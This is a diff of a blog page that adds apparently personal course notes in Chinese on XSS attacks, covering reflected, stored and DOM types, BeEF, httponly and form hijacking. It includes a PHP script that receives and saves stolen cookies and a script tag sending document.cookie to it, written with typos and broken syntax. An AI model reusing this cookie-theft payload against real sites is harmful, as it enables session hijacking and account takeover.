@@ -5,7 +5,8 @@
 <head>
     <meta charset="utf-8">
     <meta name="keywords" content="小迪-xss跨站原理和攻击, tonine">
-    <meta name="description" content="">
+    <meta name="description" content="XSS跨站之原理分析和攻击方法原理XXS漏洞产生原理：变量接收数据的时候，可以写成类似js脚本，对方将这个代码回显操作，因为是js代码，可以在网页显示执行出来。 产生在前端。输出类函数造成的，通过js代码实现。
+前提条件：浏览器版本是否支持">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -428,12 +429,25 @@
             <div class="row tag-cate">
                 <div class="col s7">
                     
-                          <div class="article-tag">
-                            <span class="chip bg-color">无标签</span>
-                          </div>
+                    <div class="article-tag">
+                        
+                            <a href="/tags/web%E6%BC%8F%E6%B4%9E/">
+                                <span class="chip bg-color">web漏洞</span>
+                            </a>
+                        
+                    </div>
                     
                 </div>
                 <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fas fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/%E5%B0%8F%E8%BF%AA%E8%A7%86%E9%A2%91%E7%AC%94%E8%AE%B0/" class="post-category">
+                                小迪视频笔记
+                            </a>
+                        
+                    </div>
                     
                 </div>
             </div>
@@ -463,7 +477,42 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                
+                <h3 id="XSS跨站之原理分析和攻击方法"><a href="#XSS跨站之原理分析和攻击方法" class="headerlink" title="XSS跨站之原理分析和攻击方法"></a><strong>XSS跨站之原理分析和攻击方法</strong></h3><h6 id="原理"><a href="#原理" class="headerlink" title="原理"></a><strong>原理</strong></h6><p>XXS漏洞产生原理：变量接收数据的时候，可以写成类似js脚本，对方将这个代码回显操作，因为是js代码，可以在网页显示执行出来。 产生在前端。输出类函数造成的，通过js代码实现。</p>
+<p>前提条件：浏览器版本是否支持</p>
+<h6 id="分类"><a href="#分类" class="headerlink" title="分类"></a><strong>分类</strong></h6><p>pikachu靶场</p>
+<p><strong>反射型</strong>（非持续性）：</p>
+<p>发包 x=xiaodi &gt; x.php &gt;回显</p>
+<p><strong>存储型</strong>（持续性）：</p>
+<p>发包 x=xiaodi &gt; x.php &gt;写到数据库某个表 &gt;x.php &gt;回显</p>
+<p><strong>DOM型</strong>：发包 x=xiaodi &gt;本地浏览器静态前端代码&gt; x.php &gt;回显</p>
+<p><strong>属于前端js代码进行处理</strong></p>
+<p>代码在操作时的属性。前端语言，</p>
+<p>参数传递：与后端语言打交道，地址会改变</p>
+<p>dom树：html语言，</p>
+<h6 id="利用XSS平台"><a href="#利用XSS平台" class="headerlink" title="利用XSS平台"></a><strong>利用XSS平台</strong></h6><p><strong>跨站工具：</strong>beef</p>
+<p><strong>cookie：</strong>用户凭据，通过凭据可以判断对方身份信息。存储在本地的，存活时间较长，小网站会用</p>
+<p><strong>session</strong>：会话，存储在服务器，存活时间较短，大型的较安全的会使用</p>
+<p><strong>XSS跨站之订单</strong></p>
+<p>**工具：postman **实现自定义抓包</p>
+<p>document.cookie</p>
+<p><strong>获取cookie的代码</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$cookie=$_GET[&#x27;c&#x27;];</span><br><span class="line"></span><br><span class="line">$myfile=fopen(&quot;cookie&quot;,&#x27;w&#x27;);</span><br><span class="line"></span><br><span class="line">fwrite($myfile,$cookie);</span><br><span class="line"></span><br><span class="line">fclose($myfile);</span><br><span class="line"></span><br><span class="line">?&gt; 假如这个文件名是 jieshou.php</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$cookie=$_GET[&#x27;c&#x27;]；</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;script src=http://127.0.0.1/jieshou.php？c=‘+docunment.cookie’&gt; &lt;script&gt;</span><br><span class="line">手写获取cookie</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h6 id="WEBSHELL箱子管理系统"><a href="#WEBSHELL箱子管理系统" class="headerlink" title="WEBSHELL箱子管理系统"></a><strong>WEBSHELL箱子管理系统</strong></h6><h6 id="如何判定一个文件有没有后门"><a href="#如何判定一个文件有没有后门" class="headerlink" title="如何判定一个文件有没有后门"></a><strong>如何判定一个文件有没有后门</strong></h6><ul>
+<li>如果是脚本 ，搭建一下，看是否有发送到别的地址</li>
+<li>程序的话，抓包一下进程</li>
+</ul>
+<p><strong>XXS利用条件</strong>：</p>
+<ul>
+<li>留言板、评论区、订单系统、反馈条件。</li>
+<li>如果用了session，跨站平台接收不到session，是登录不了后台的，</li>
+</ul>
+<p>如何解决？：利用beef让对方去访问phpinfo地址，再结合跨站平台 获取网站源码，</p>
+<h6 id="XSS跨站之代码及httponly绕过"><a href="#XSS跨站之代码及httponly绕过" class="headerlink" title="XSS跨站之代码及httponly绕过"></a><strong>XSS跨站之代码及httponly绕过</strong></h6><ul>
+<li><strong>httponly</strong>：cookie中设置了这个属性，通过js脚本将无法获取cookie信息，可以防止xss攻击</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">登陆后台的方法：cookie或账号密码</span><br><span class="line"></span><br><span class="line">账号密码分为保存和未保存</span><br><span class="line"></span><br><span class="line">保存读取：xss平台里，然后查看网站源代码，修改需要配置的参数</span><br><span class="line"></span><br><span class="line">不保存读取（表单截取）：前提条件：需要在登录框处有跨站漏洞，利用表单劫持</span><br></pre></td></tr></table></figure>
+
                 
             </div>
             <hr/>
@@ -526,7 +575,11 @@
                 <div class="post-meta__tag-list" style="display: inline-block;">
                     
                         <div class="article-tag">
-                            <span class="chip bg-color">无标签</span>
+                            
+                                <a href="/tags/web%E6%BC%8F%E6%B4%9E/">
+                                    <span class="chip bg-color">web漏洞</span>
+                                </a>
+                            
                         </div>
                     
                 </div>
@@ -722,13 +775,25 @@
                             </span>
                         <span class="publish-author">
                             
-                            <i class="fas fa-user fa-fw"></i>
-                            John Doe
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/%E5%B0%8F%E8%BF%AA%E8%A7%86%E9%A2%91%E7%AC%94%E8%AE%B0/" class="post-category">
+                                    小迪视频笔记
+                                </a>
+                            
                             
                         </span>
                     </div>
                 </div>
 
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/web%E6%BC%8F%E6%B4%9E/">
+                        <span class="chip bg-color">web漏洞</span>
+                    </a>
+                    
+                </div>
                 
             </div>
         </div>
